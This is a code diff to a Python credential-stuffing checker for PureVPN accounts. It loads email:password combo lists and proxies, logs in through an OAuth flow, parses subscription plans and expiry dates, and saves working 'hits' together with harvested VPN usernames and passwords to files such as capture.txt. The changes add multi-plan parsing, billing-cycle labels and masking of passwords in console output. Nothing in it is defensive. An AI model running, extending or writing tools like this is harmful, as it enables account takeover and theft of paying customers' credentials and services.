@@ -4,6 +4,7 @@ import time
 import os
 import sys
 import random
+from datetime import datetime
 from urllib.parse import urlparse, parse_qs, quote
 from colorama import Fore, Style, init
 
@@ -37,6 +38,15 @@ CODE_CHALLENGE = "Q5D1Qr0RAlZbVeXGTec24qj6FsW00cKS_LH01PFNGa8"
 CODE_VERIFIER = "57c9d0cebb497ba4491400b6b8666181ac3f217c11889e55ea550285"
 REDIRECT_URI = "https://bfidboloedlamgdmenmlbipfnccokknp.chromiumapp.org/oauth2"
 TENANT_ID = "9707f41e-21a4-bbc5-dcbc-fdf6b61cc68f"
+
+PLAN_MAP = {
+    "9925395": "Standard",
+    "11329606": "Max",
+    "11329603": "Plus",
+    "purevpn-standard": "Standard",
+    "purevpn-plus": "Plus",
+    "purevpn-max": "Max"
+}
 
 combos = []
 proxies = []
@@ -207,48 +217,75 @@ def check_account(email, password):
                 session.close()
                 continue
 
-            plan = "N/A"
-            expiry = "N/A"
-            expiry_timestamp = 0
+            plans_list = []
             vpn_user = "N/A"
             vpn_pass = "N/A"
             is_free = False
-            status = "N/A"
-
+            
             try:
                 for grant in userinfo_json.get("entity_grants", []):
                     if grant.get("entity") == "vpn_premium":
                         info = grant.get("billing_info", {})
-                        plan = info.get("plan", plan)
-                        status = info.get("status", status)
+                        
+                        p_name = info.get("plan", "N/A")
+                        p_expiry = "N/A"
+                        p_start_ts = 0
+                        p_expiry_ts = 0
                         
                         if info.get("end_date"):
-                            try:
+                             try:
                                 dt = info.get("end_date").split("T")[0]
-                                expiry = dt
-                                expiry_timestamp = time.mktime(time.strptime(dt, "%Y-%m-%d"))
-                            except: pass
-                        
-                        vpn_user = info.get("vpn_username", vpn_user)
+                                p_expiry = dt
+                                p_expiry_ts = time.mktime(time.strptime(dt, "%Y-%m-%d"))
+                             except: pass
 
+                        vpn_user = info.get("vpn_username", vpn_user)
+                        
+                        if p_name != "N/A":
+                             plans_list.append({
+                                 "name": p_name,
+                                 "expiry": p_expiry,
+                                 "expiry_ts": p_expiry_ts,
+                                 "start_ts": p_start_ts,
+                                 "source": "fusionauth_grant"
+                             })
+                             
                 b2c = userinfo_json.get("user", {}).get("data", {}).get("subscription", {}).get("b2c", [])
                 if b2c:
-                    sub = b2c[0]
-                    if plan == "N/A": 
-                        plan = sub.get("plan", plan)
-                    status = sub.get("status", status)
-                    
-                    if sub.get("expiry"):
-                        expiry = sub.get("expiry")
-                        try:
-                            expiry_timestamp = time.mktime(time.strptime(expiry, "%Y-%m-%d"))
-                        except: pass
-                    
-                    vpn_user = sub.get("vpnusername", vpn_user)
+                    for sub in b2c:
+                        p_name = sub.get("plan", "N/A")
+                        p_expiry = sub.get("expiry", "N/A")
+                        p_expiry_ts = 0
+                        p_start_ts = 0
+                        
+                        if p_expiry != "N/A":
+                            try:
+                                p_expiry_ts = time.mktime(time.strptime(p_expiry, "%Y-%m-%d"))
+                            except: pass
+                        
+                        vpn_user = sub.get("vpnusername", vpn_user)
+                        
+                        if p_name != "N/A":
+                            exists = False
+                            for ex in plans_list:
+                                if ex["name"] == p_name:
+                                    exists = True
+                                    if p_expiry != "N/A" and ex["expiry"] == "N/A":
+                                         ex["expiry"] = p_expiry
+                                         ex["expiry_ts"] = p_expiry_ts
+                                    break
+                            
+                            if not exists:
+                                plans_list.append({
+                                    "name": p_name,
+                                    "expiry": p_expiry,
+                                    "expiry_ts": p_expiry_ts,
+                                    "start_ts": p_start_ts,
+                                    "source": "fusionauth_b2c"
+                                })
 
             except Exception:
                 pass
-
 
             sub_url = "https://api.purevpn.com/api/v1/user/subscription"
             resp = session.get(sub_url, timeout=TIMEOUT)
@@ -256,54 +293,140 @@ def check_account(email, password):
             if resp.status_code == 200:
                 try:
                     data = resp.json().get("data", {})
-                    plan = data.get("plan_name", plan)
+                    p_name = data.get("plan_name", "N/A")
                     
-                    ts = data.get("expiry_date")
-                    if ts:
-                        expiry_timestamp = ts
-                        expiry = time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(ts))
+                    p_expiry_ts = data.get("expiry_date", 0)
+                    p_expiry = "N/A"
+                    if p_expiry_ts:
+                        p_expiry = time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(p_expiry_ts))
                     
+                    p_start_ts = data.get("start_date", 0)
+
                     is_free = data.get("is_free_user", False)
 
                     creds = data.get("vpn_credentials", {})
                     vpn_user = creds.get("username", vpn_user)
                     vpn_pass = creds.get("password", vpn_pass)
+                    
+                    found = False
+                    for plan_item in plans_list:
+                         if plan_item["name"] == p_name:
+                              plan_item["start_ts"] = p_start_ts 
+                              if p_expiry != "N/A":
+                                   plan_item["expiry"] = p_expiry
+                                   plan_item["expiry_ts"] = p_expiry_ts
+                              plan_item["source"] = "api_v1" 
+                              found = True
+                              break
+                    
+                    if not found and p_name != "N/A":
+                         plans_list.append({
+                             "name": p_name,
+                             "expiry": p_expiry,
+                             "expiry_ts": p_expiry_ts,
+                             "start_ts": p_start_ts,
+                             "source": "api_v1"
+                         })
 
                 except ValueError:
                     session.close()
                     continue
 
             elif resp.status_code == 404:
-                if plan == "N/A":
+                if not plans_list:
                      is_free = True
-                     plan = "Free (No Subscription Profile)"
+                     plans_list.append({
+                         "name": "Free (No Subscription Profile)",
+                         "expiry": "N/A",
+                         "expiry_ts": 0,
+                         "start_ts": 0,
+                         "source": "api_404"
+                     })
             else:
                  session.close()
                  continue
-
-            capture = f"Plan: {plan} | Expiry: {expiry} | VPN User: {vpn_user} | VPN Pass: {vpn_pass}"
-            line = f"{email}:{password} | {capture}"
             
+            final_plans = []
             current_time = time.time()
-            
-            if (expiry_timestamp != 0 and expiry_timestamp < current_time) or status == "expired":
-                expired += 1 
-                log("EXPIRED", line)
-                save_hit(EXPIRED_FILE, line)
-            
-            elif "expired" in str(plan).lower(): 
-                expired += 1 
-                log("EXPIRED", line)
-                save_hit(EXPIRED_FILE, line)
+            all_expired = True
+            if not plans_list and not is_free:
+                 plans_list.append({
+                     "name": "Free/Empty",
+                     "expiry": "N/A",
+                     "expiry_ts": 0,
+                     "start_ts": 0
+                 })
+
+            seen_final_plans = set()
+
+            for plan_item in plans_list:
+                name = plan_item["name"]
                 
-            elif is_free:
+                if str(name) in PLAN_MAP:
+                    name = PLAN_MAP[str(name)]
+                else:
+                    # Fuzzy match fallback
+                    n_lower = str(name).lower()
+                    if "max" in n_lower:
+                        name = "Max"
+                    elif "plus" in n_lower:
+                         name = "Plus"
+                    elif "standard" in n_lower or "plan" in n_lower:
+                         name = "Standard"
+                
+                cycle = ""
+                if plan_item["expiry_ts"] and plan_item["start_ts"]:
+                    try:
+                        days = (datetime.fromtimestamp(plan_item["expiry_ts"]) - datetime.fromtimestamp(plan_item["start_ts"])).days
+                        if days < 28: cycle = f"{days} Days"
+                        elif days <= 40: cycle = "Monthly"
+                        elif 300 <= days <= 400: cycle = "Yearly"
+                        elif 700 <= days <= 760: cycle = "2 Years"
+                        elif 1800 <= days <= 1900: cycle = "5 Years"
+                        else: cycle = f"{days} Days"
+                    except: pass
+                
+                if cycle:
+                    name = f"{name} ({cycle})"
+                
+                is_this_expired = False
+                if plan_item["expiry_ts"] != 0 and plan_item["expiry_ts"] < current_time:
+                     is_this_expired = True
+                
+                if "expired" in str(name).lower():
+                     is_this_expired = True
+                
+                if not name or str(name).strip() == "":
+                     name = "Unknown Plan"
+
+                if not is_this_expired:
+                     all_expired = False
+                     
+                plan_str = f"{name} [Exp: {plan_item['expiry']}]"
+                if plan_str not in seen_final_plans:
+                     final_plans.append(plan_str)
+                     seen_final_plans.add(plan_str)
+
+            plan_string = ", ".join(final_plans)
+            capture = f"Plan: {plan_string} | VPN User: {vpn_user} | VPN Pass: {vpn_pass}"
+            line = f"{email}:{password} | {capture}"
+            # Mask password for logs
+            masked_pwd = "*" * 8
+            masked_line = f"{email}:{masked_pwd} | {capture}"
+            
+            if all_expired:
+                expired += 1 
+                log("EXPIRED", masked_line)
+                save_hit(EXPIRED_FILE, line)
+            
+            elif is_free and all_expired:
                 free += 1
-                log("FREE", line)
+                log("FREE", masked_line)
                 save_hit(FREE_FILE, line)
                 
             else:
                 hits += 1
-                log("HIT", line)
+                log("HIT", masked_line)
                 save_hit(HITS_FILE, f"{email}:{password}")
                 save_hit("capture.txt", line)
             
